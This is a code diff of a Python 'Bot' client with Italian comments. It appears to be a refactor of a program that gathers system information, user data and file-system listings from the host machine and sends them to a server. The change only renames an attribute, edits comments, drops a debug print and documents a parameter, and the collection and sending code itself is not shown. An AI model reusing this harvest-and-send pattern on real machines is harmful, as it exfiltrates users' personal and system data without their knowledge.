@@ -16,7 +16,7 @@ SUCCESSFUL_RESPONSE = 'ok'
 
 class Bot:
     def __init__(self):
-        self.ScavengerObject = systemRetrieval.InformationScavanger()
+        self.Scavenger = systemRetrieval.InformationScavanger()
 
         self.data_sentence = ''
         self.fileSystem_sentence = ''
@@ -71,19 +71,19 @@ class Bot:
         Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale del pacchetto da inviare.
         :return: None
         """
-        inputDict = self.ScavengerObject.systemRetrieval()
+        inputDict = self.Scavenger.systemRetrieval()
         self.data_sentence = json.dumps(inputDict)
 
         self.send_sentence = self.data_sentence
         print("thread_data terminated.")
 
     def fileSystemScavange(self):
-        # prendi user
-        userData = self.ScavengerObject.retriveUser()
-        # mandi user
+        # prende dati user
+        userData = self.Scavenger.retriveUser()
+        # manda dati user
         self.sendToServer(userData)
-        print("User Mandato?")
-        inputSentence = self.ScavengerObject.fileSystemRetrival()
+
+        inputSentence = self.Scavenger.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
         print("thread_fileSystem terminated.")
@@ -91,6 +91,7 @@ class Bot:
     def sendToServer(self, data=''):
         """
         Il client invia al server i dati raccolti in formato .json.
+        :parameter data eventuale dato da inviare, altrimenti invia la send sentence della classe
         :return: None
         """
         if data == '':
